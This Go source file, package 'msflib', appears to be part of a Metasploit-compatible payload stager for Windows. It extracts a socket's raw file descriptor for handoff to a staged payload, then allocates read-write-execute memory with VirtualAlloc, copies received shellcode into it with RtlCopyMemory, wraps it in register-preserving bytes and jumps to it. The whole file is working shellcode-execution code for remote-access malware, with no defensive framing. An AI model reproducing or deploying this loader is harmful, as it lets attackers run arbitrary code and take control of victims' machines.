package msflib

import (
	"bytes"
	"encoding/binary"
	"net"
	"reflect"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	virtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func init() {
	// msf mode setings
	CHECKSUMMODE = 92
	PLATFORM = 1
}

// return a socket file descriptor as 4 bytes
func getFDBytes(conn *net.TCPConn) []byte {
	fd := reflect.ValueOf(*conn).FieldByName("fd")
	handle := reflect.Indirect(fd).FieldByName("sysfd")
	buff := new(bytes.Buffer)
	binary.Write(buff, binary.LittleEndian, handle.Int())
	return buff.Bytes()
}

// call payload
func callPayload(payload []byte) error {
	// modify payload to comply with the plan9 calling convention
	payload = append(
		[]byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57},
		append(
			payload,
			[]byte{0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3}...,
		)...,
	)
	addr, _, err := virtualAlloc.Call(0, uintptr(len(payload)), 0x1000|0x2000, 0x40)
	if addr == 0 {
		return err
	}
	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&payload[0])), uintptr(len(payload)))
	caller(addr)
	return nil
}
